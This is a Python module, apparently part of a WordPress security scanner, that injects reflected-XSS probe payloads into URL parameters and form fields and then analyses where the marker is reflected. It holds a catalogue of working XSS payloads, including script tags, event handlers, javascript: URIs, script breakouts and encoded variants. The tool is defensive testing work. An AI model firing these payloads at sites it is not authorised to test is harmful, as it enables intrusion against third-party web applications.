# Module for Contextual WordPress XSS Checks
import requests # Retained for context, though make_request is used
import html     # Added for html.escape
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote_plus
from bs4 import BeautifulSoup, Comment
import base64   # Added for dynamic Base64 payload generation

# --- Mock Objects for Standalone Testing (Remove or comment out in a real project) ---
# Attempt to import the real make_request, fallback to mock if not found or for testing
try:
    from core.utils import make_request
except ImportError:
    print("WARN: core.utils.make_request not found, using mock function.")
    class MockResponse:
        def __init__(self, text, status_code=200, url=""):
            self.text = text
            self.status_code = status_code
            self.url = url # Actual response objects often have this

    def make_request_mock(url, config, method="GET", data=None, params=None, timeout=7):
        # print(f"        MOCK REQUEST: {method} {url} Data: {data} Params: {params if params else urlparse(url).query}")
        global UNIQUE_XSS_MARKER # Access global marker for simulation
        response_text = f"<html><head><title>Test Page</title></head><body>Default page for {url}. No reflection.</body></html>"
        status = 200

        # Simulate reflection for specific tests
        combined_inputs_str = ""
        actual_params_or_data = {}

        if method == "GET":
            parsed_operation_url = urlparse(url)
            actual_params_or_data = parse_qs(parsed_operation_url.query)
            for k, v_list in actual_params_or_data.items():
                for v_item in v_list: combined_inputs_str += f" {k}={v_item}"
        elif method == "POST" and data:
            actual_params_or_data = data
            for k, v_item in actual_params_or_data.items(): combined_inputs_str += f" {k}={v_item}"

        if UNIQUE_XSS_MARKER in combined_inputs_str:
            # Simple reflection in HTML text
            if any(p_val == f"<script>{UNIQUE_XSS_MARKER}()</script>" for p_val_list in actual_params_or_data.values() for p_val in (p_val_list if isinstance(p_val_list, list) else [p_val_list])):
                # Simulate unescaped script injection
                reflected_content = ""
                for k,v in actual_params_or_data.items():
                    if UNIQUE_XSS_MARKER in str(v):
                        reflected_content = str(v) # reflect the payload directly
                        break
                response_text = f"<html><body>Reflected script: {reflected_content}</body></html>"
            # Reflection in attribute
            elif any(f"onerror=event={UNIQUE_XSS_MARKER}()" in str(p_val) for p_val_list in actual_params_or_data.values() for p_val in (p_val_list if isinstance(p_val_list, list) else [p_val_list])):
                reflected_attr_val = ""
                for k,v in actual_params_or_data.items():
                     if UNIQUE_XSS_MARKER in str(v):
                        reflected_attr_val = html.escape(str(v)) # attribute values are often escaped
                        break
                response_text = f"<html><body><img src='x' data-info='{reflected_attr_val}'></body></html>"
            else: # Generic reflection in HTML body
                response_text = f"<html><body>Reflected text: {html.escape(combined_inputs_str)} ({UNIQUE_XSS_MARKER} found)</body></html>"
        
        # Simulate a page with forms for the form parsing logic
        if method == "GET" and url.endswith("/contact_page_for_forms"):
             response_text = """
            <html><body>
                <h1>Contact Us</h1>
                <form action="/submit_contact" method="POST">
                    Name: <input type="text" name="name" value="John Doe"><br>
                    Email: <input type="email" name="email" value=""><br>
                    HiddenField: <input type="hidden" name="secretinfo" value="initial_secret"> <br>
                    Message: <textarea name="message">Default message</textarea><br>
                    <input type="submit" value="Send">
                </form>
                <form action="/search_get_action" method="GET">
                    Search: <input type="text" name="q" value="default search">
                    Category: <select name="cat"><option value="web">Web</option><option value="images" selected>Images</option></select>
                    <input type="submit" value="Search GET">
                </form>
            </body></html>
            """
        return MockResponse(response_text, status, url=url)
    make_request = make_request_mock # Override with mock

class MockState:
    def __init__(self):
        self.findings = {}
        self.remediations = []
    def get_specific_finding(self, module_key, findings_key, default_value):
        module_findings = self.findings.setdefault(module_key, {})
        return module_findings.setdefault(findings_key, default_value)
    def update_specific_finding(self, module_key, findings_key, value):
        self.findings.setdefault(module_key, {})[findings_key] = value
        # print(f"    MOCK_STATE: Updated finding {module_key}.{findings_key}")
    def add_remediation_suggestion(self, key, details):
        self.remediations.append({"key": key, "details": details})
        # print(f"    MOCK_STATE: Added remediation {key}")
# --- End Mock Objects ---


UNIQUE_XSS_MARKER = "XSSPROBECLINE99"
UNIQUE_XSS_PAYLOAD_EVENT = f"event={UNIQUE_XSS_MARKER}()"

XSS_PAYLOADS = {
    "html_tag_injection": [
        f"<script>{UNIQUE_XSS_MARKER}()</script>",
        f"<SCRiPT>{UNIQUE_XSS_MARKER}()</SCRiPT>",
        f"<img src=x onerror={UNIQUE_XSS_PAYLOAD_EVENT}>",
        f"<svg onload={UNIQUE_XSS_PAYLOAD_EVENT}>",
        f"<details open ontoggle={UNIQUE_XSS_PAYLOAD_EVENT}>",
        f"<iframe src=\"javascript:{UNIQUE_XSS_PAYLOAD_EVENT}\"></iframe>",
        f"<a href=\"javascript:{UNIQUE_XSS_PAYLOAD_EVENT}\">ClickMe</a>",
        f"<div onmouseover={UNIQUE_XSS_PAYLOAD_EVENT}>HoverMe</div>",
        f"<video><source onerror=\"{UNIQUE_XSS_PAYLOAD_EVENT}\"></video>",
        f"<audio src=x onerror={UNIQUE_XSS_PAYLOAD_EVENT}>",
        f"<body onload={UNIQUE_XSS_PAYLOAD_EVENT}>",
        f"<object data=\"javascript:{UNIQUE_XSS_PAYLOAD_EVENT}\"></object>",
        f"<embed src=\"javascript:{UNIQUE_XSS_PAYLOAD_EVENT}\"></embed>",
        f"<form action=\"javascript:{UNIQUE_XSS_PAYLOAD_EVENT}\"><input type=submit></form>",
        f"<isindex type=image src=1 onerror={UNIQUE_XSS_PAYLOAD_EVENT}>",
        f"<marquee onstart={UNIQUE_XSS_PAYLOAD_EVENT}></marquee>",
    ],
    "html_attribute_injection": [
        f"\" onerror={UNIQUE_XSS_PAYLOAD_EVENT} data-dummy=\"",
        f"' onerror={UNIQUE_XSS_PAYLOAD_EVENT} data-dummy='",
        f"\" onfocus={UNIQUE_XSS_PAYLOAD_EVENT} autofocus data-dummy=\"",
        f"\" oninput={UNIQUE_XSS_PAYLOAD_EVENT} data-dummy=\"",
        f"javascript:{UNIQUE_XSS_PAYLOAD_EVENT}",
        f" JaVaScRiPt:{UNIQUE_XSS_PAYLOAD_EVENT}",
        f"vbscript:{UNIQUE_XSS_MARKER}", # Simple VBScript marker
    ],
    "script_context_breakout": [
        f"';{UNIQUE_XSS_PAYLOAD_EVENT};//",
        f"\";{UNIQUE_XSS_PAYLOAD_EVENT};//",
        f"</script><script>{UNIQUE_XSS_MARKER}()</script>",
        f"';alert('{UNIQUE_XSS_MARKER}');//", # Uses alert, but marker is present
        f"`];{UNIQUE_XSS_PAYLOAD_EVENT}();//`",
    ],
    "url_parameter_specific": [ # For URL params directly used in JS links/redirects
        f"javascript:{UNIQUE_XSS_PAYLOAD_EVENT}"
    ],
    "encoded_variations": [
        f"<script>{UNIQUE_XSS_MARKER}()</script>", # Raw, also in html_tag_injection
        f"%3Cscript%3E{UNIQUE_XSS_MARKER}('URLENC')%3C%2Fscript%3E", # URL Encoded
        f"%253Cscript%253E{UNIQUE_XSS_MARKER}('DBLURLENC')%253C%252Fscript%253E", # Double URL Encoded
    ]
}

# Dynamically generate and add the correct Base64 payload
_base64_script_content = f"<script>{UNIQUE_XSS_MARKER}('BASE64')</script>"
_encoded_base64_payload_content = base64.b64encode(_base64_script_content.encode('utf-8')).decode('ascii')

# Ensure the specific problematic Base64 payload is replaced/added correctly
_old_base64_marker_signature = "YV0lORE9XU1BST0JFQ0xJTkU" # Part of the old, incorrect base64 payload
XSS_PAYLOADS["encoded_variations"] = [
    p for p in XSS_PAYLOADS["encoded_variations"] if _old_base64_marker_signature not in p
]
XSS_PAYLOADS["encoded_variations"].append(f"data:text/html;base64,{_encoded_base64_payload_content}")
XSS_PAYLOADS["encoded_variations"] = sorted(list(set(XSS_PAYLOADS["encoded_variations"]))) # Deduplicate and sort


def _analyze_reflection_context(response_text, payload_marker):
    contexts = set()
    if payload_marker not in response_text:
        return list(contexts)

    try:
        try:
            soup = BeautifulSoup(response_text, 'lxml')
        except Exception: # Fallback if lxml is not installed or fails
            soup = BeautifulSoup(response_text, 'html.parser')

        for text_node in soup.find_all(string=True):
            # Using str() ensures we handle NavigableString and other types correctly
            if payload_marker in str(text_node):
                parent_name = getattr(text_node.parent, 'name', None)
                if parent_name == 'script': contexts.add("script_content")
                elif parent_name == 'style': contexts.add("style_content")
                elif isinstance(text_node, Comment): contexts.add("html_comment")
                else: contexts.add("html_text")

        for tag in soup.find_all(True): # True matches all tags
            for attr_name, attr_value in tag.attrs.items():
                attr_values_to_check = []
                if isinstance(attr_value, str):
                    attr_values_to_check.append(attr_value)
                elif isinstance(attr_value, list): # e.g. 'class' attribute
                    attr_values_to_check.extend(map(str, attr_value))

                for val_item in attr_values_to_check:
                    if payload_marker in val_item:
                        # Check if it's likely an event handler or a javascript: URI
                        if attr_name.lower().startswith("on") or \
                           val_item.strip().lower().startswith("javascript:"):
                            contexts.add("attribute_event_handler_or_js_uri")
                        else:
                            contexts.add("attribute_value")
                        break # Found in this attribute's value part

        # If marker was in raw response, but BS4 didn't categorize it (e.g. malformed HTML)
        if not contexts and payload_marker in response_text:
            contexts.add("unknown_raw_reflection")
    except Exception as e:
        print(f"        [-] Error during reflection context analysis: {e}")
        contexts.add("parsing_error")
    return list(contexts)


def _test_injection_point(url_to_test, http_method, param_or_data_config, field_name_or_original_val,
                          payload_category, payload, scan_config, reflected_points_list,
                          form_action_url_override=None):
    
    test_post_data = None
    current_target_url = url_to_test
    tested_parameter_name = ""

    if http_method == "GET":
        param_name_to_inject = param_or_data_config # This is the parameter name (string)
        # field_name_or_original_val is the original GET parameter value (string), not directly used for injection construction here
        
        parsed_url = urlparse(current_target_url)
        query_dict = parse_qs(parsed_url.query, keep_blank_values=True)
        
        # Flatten values for easier manipulation, then inject. urlencode handles lists if needed.
        temp_query_dict = {k: v[0] if len(v) == 1 else v for k, v in query_dict.items()}
        temp_query_dict[param_name_to_inject] = payload
        
        new_query = urlencode(temp_query_dict, quote_via=quote_plus, doseq=True)
        current_target_url = parsed_url._replace(query=new_query).geturl()
        tested_parameter_name = param_name_to_inject

    elif http_method == "POST":
        base_form_data = param_or_data_config # This is the base form data (dict)
        field_to_inject_in_post = field_name_or_original_val # This is the field name to inject (string)

        test_post_data = base_form_data.copy()
        test_post_data[field_to_inject_in_post] = payload
        
        current_target_url = form_action_url_override if form_action_url_override else url_to_test
        tested_parameter_name = field_to_inject_in_post
    else:
        return False # Should not happen

    log_payload = payload[:60] + "..." if len(payload) > 60 else payload
    print(f"        Testing {http_method} {payload_category} for '{tested_parameter_name}' on {current_target_url} with payload: {log_payload}")

    try:
        response = None
        if http_method == "GET":
            response = make_request(current_target_url, scan_config, method="GET", timeout=7)
        elif http_method == "POST":
            response = make_request(current_target_url, scan_config, method="POST", data=test_post_data, timeout=7)

        if response and response.status_code < 400 and response.text: # Allow 2xx and 3xx
            reflection_contexts = _analyze_reflection_context(response.text, UNIQUE_XSS_MARKER)
            
            if reflection_contexts and "parsing_error" not in reflection_contexts:
                safe_payload_report = html.escape(payload)
                point_info = {
                    "url": response.url if hasattr(response, 'url') and response.url else current_target_url, # Use final URL after redirects
                    "parameter": tested_parameter_name,
                    "payload_category": payload_category,
                    "payload_used": safe_payload_report,
                    "method": http_method,
                    "reflection_contexts": sorted(list(reflection_contexts)),
                    "detail": f"Marker '{UNIQUE_XSS_MARKER}' reflected in contexts: {', '.join(sorted(list(reflection_contexts)))}. Manual verification required."
                }
                reflected_points_list.append(point_info)
                print(f"          [!!!] Potential XSS reflection for '{tested_parameter_name}' (Contexts: {', '.join(sorted(list(reflection_contexts)))})")
                return True
    except Exception as e:
        print(f"          [-] Error testing XSS for '{tested_parameter_name}' on {current_target_url}: {e}")
    return False


def analyze_xss(state, config, target_url):
    module_key = "wp_analyzer_xss" # Make key more specific
    findings_key = "contextual_xss_findings"
    findings = state.get_specific_finding(module_key, findings_key, {
        "status": "Running", "details": "Performing enhanced heuristic XSS checks...",
        "potential_reflected_xss": [],
        "recommendation": "Use dedicated XSS scanning tools with browser engines for comprehensive analysis. Verify all findings manually."
    })

    print(f"    [i] Starting XSS heuristic checks for {target_url} (URL params & forms)...")
    reflected_points = []
    urls_to_scan = {target_url} # Currently scans only the entry point.

    for current_page_url in urls_to_scan:
        print(f"      Scanning URL for XSS (params & forms): {current_page_url}")
        parsed_current_url = urlparse(current_page_url)
        query_params = parse_qs(parsed_current_url.query, keep_blank_values=True)

        if query_params:
            print(f"        Found {len(query_params)} query parameters in {current_page_url}")
            for param_name, param_values in query_params.items():
                original_value = param_values[0] if param_values else ""
                for category, payloads in XSS_PAYLOADS.items():
                    for payload in payloads:
                        _test_injection_point(current_page_url, "GET",
                                              param_name, original_value,
                                              category, payload, config, reflected_points)
        else:
            print(f"        No query parameters found in {current_page_url} to test directly via URL.")
        
        print(f"      Fetching and parsing forms from {current_page_url}...")
        try:
            # Fetch the page to find forms
            page_response = make_request(current_page_url, config, method="GET", timeout=10)
            if page_response and page_response.status_code < 400 and page_response.text:
                try:
                    soup = BeautifulSoup(page_response.text, 'lxml')
                except Exception:
                    soup = BeautifulSoup(page_response.text, 'html.parser')
                
                forms = soup.find_all('form')
                print(f"        Found {len(forms)} forms on {current_page_url}.")

                for i, form_tag in enumerate(forms):
                    form_action_raw = form_tag.get('action', '')
                    form_method = form_tag.get('method', 'GET').upper()
                    # Resolve action_url correctly: if raw is empty, use current page; otherwise join.
                    action_url = urljoin(current_page_url, form_action_raw if form_action_raw else parsed_current_url.path)


                    base_form_data = {}
                    fields_to_test = []

                    for field in form_tag.find_all(['input', 'textarea', 'select']):
                        name = field.get('name')
                        if not name: continue

                        field_value = ''
                        field_type = 'text' # Default

                        if field.name == 'textarea':
                            field_value = field.string or ''
                            field_type = 'textarea'
                        elif field.name == 'select':
                            field_type = 'select'
                            selected_option = field.find('option', selected=True)
                            if selected_option:
                                field_value = selected_option.get('value', selected_option.string or '')
                            else: # No selected, try first option
                                first_option = field.find('option')
                                if first_option:
                                    field_value = first_option.get('value', first_option.string or '')
                        elif field.name == 'input':
                            field_type = field.get('type', 'text').lower()
                            if field_type in ['checkbox', 'radio']:
                                field_value = field.get('value', 'on') # Default value if checked and no value attr
                            else:
                                field_value = field.get('value', '')
                        
                        if name in base_form_data: # Handle multi-value fields (e.g. checkboxes with same name)
                            if not isinstance(base_form_data[name], list):
                                base_form_data[name] = [base_form_data[name]]
                            base_form_data[name].append(field_value)
                        else:
                            base_form_data[name] = field_value
                        
                        # Test most field types except explicit non-textual/button types
                        if field_type not in ['submit', 'button', 'reset', 'image', 'file']:
                            if name not in fields_to_test:
                                fields_to_test.append(name)
                    
                    if not fields_to_test:
                        print(f"        Form #{i+1} (Action: {action_url}, Method: {form_method}) has no injectable fields.")
                        continue

                    print(f"        Testing Form #{i+1} (Action: {action_url}, Method: {form_method}) Fields: {', '.join(fields_to_test)}")
                    for field_name_to_inject in fields_to_test:
                        for category, payloads in XSS_PAYLOADS.items():
                            for payload in payloads:
                                if form_method == "POST":
                                    _test_injection_point(current_page_url, "POST",
                                                          base_form_data, field_name_to_inject,
                                                          category, payload, config, reflected_points,
                                                          form_action_url_override=action_url)
                                elif form_method == "GET":
                                    original_field_val = base_form_data.get(field_name_to_inject, '')
                                    if isinstance(original_field_val, list): # Take first for GET test
                                        original_field_val = original_field_val[0] if original_field_val else ''
                                    _test_injection_point(action_url, "GET",
                                                          field_name_to_inject, original_field_val,
                                                          category, payload, config, reflected_points)
            else:
                status = page_response.status_code if page_response else "No Response"
                print(f"      [-] Failed to fetch or non-success status from {current_page_url}. Status: {status}")
        except Exception as e:
            print(f"      [-] Error fetching/parsing forms from {current_page_url}: {e}")

    if reflected_points:
        unique_vuln_points = {}
        for rp in reflected_points:
            key = (rp["url"], rp["parameter"], rp["method"], frozenset(rp["reflection_contexts"]))
            if key not in unique_vuln_points:
                unique_vuln_points[key] = rp
        
        findings["potential_reflected_xss"] = list(unique_vuln_points.values())
        num_vulns = len(findings["potential_reflected_xss"])

        if num_vulns > 0:
            findings["details"] = f"Found {num_vulns} potential unique XSS reflection point(s). Manual verification CRUCIAL."
            all_observed_contexts = sorted(list(set(ctx for rp_val in unique_vuln_points.values() for ctx in rp_val["reflection_contexts"])))
            
            state.add_remediation_suggestion(f"{module_key}_reflected_heuristic_adv", {
                "source": "WP Analyzer (XSS Heuristic - Advanced)",
                "description": f"Advanced heuristic checks found {num_vulns} unique point(s) where XSS payloads containing '{UNIQUE_XSS_MARKER}' were reflected. Reflection contexts observed include: {all_observed_contexts}. This indicates POTENTIAL Reflected XSS. Thorough manual testing with browser-based tools is CRUCIAL.",
                "severity": "Medium", # Adjust severity based on context if needed
                "remediation": "Validate/sanitize all user input. Implement context-aware output encoding (e.g., HTML entity encoding for HTML text, JavaScript string escaping for script contexts). Use Content Security Policy (CSP). Conduct thorough XSS testing with specialized browser-based tools."
            })
        else: # Should not happen if reflected_points was non-empty, but for safety
             findings["details"] = "XSS checks completed. Some reflections initially found, but none were unique or passed filters. Review logs."
    else:
        findings["details"] = "No XSS reflections found from enhanced heuristic checks. This does not rule out DOM-based or complex stored XSS, or XSS in non-2xx/3xx responses."

    findings["status"] = "Completed"
    state.update_specific_finding(module_key, findings_key, findings)
    print(f"    [+] Advanced XSS heuristic checks finished. Details: {findings['details']}")


# Example of how to run (remove or comment out in production)
if __name__ == '__main__':
    mock_config = {"user_agent": "TestScanner/1.0", "cookies": {}, "headers": {}}
    mock_state_obj = MockState()
    
    print("--- TEST 1: URL with GET parameters ---")
    test_target_url_get = "http://testserver.com/search?query=initial_query&page=1"
    analyze_xss(mock_state_obj, mock_config, test_target_url_get)
    print("\n")

    print("--- TEST 2: URL with Forms (mocked to return form HTML) ---")
    # Mock make_request should return form HTML for this URL
    test_target_url_forms = "http://testserver.com/contact_page_for_forms"
    analyze_xss(mock_state_obj, mock_config, test_target_url_forms)
    print("\n")

    print("--- MOCK STATE FINDINGS ---")
    import json
    print(json.dumps(mock_state_obj.findings, indent=2))
    print("\n--- MOCK STATE REMEDIATIONS ---")
    print(json.dumps(mock_state_obj.remediations, indent=2))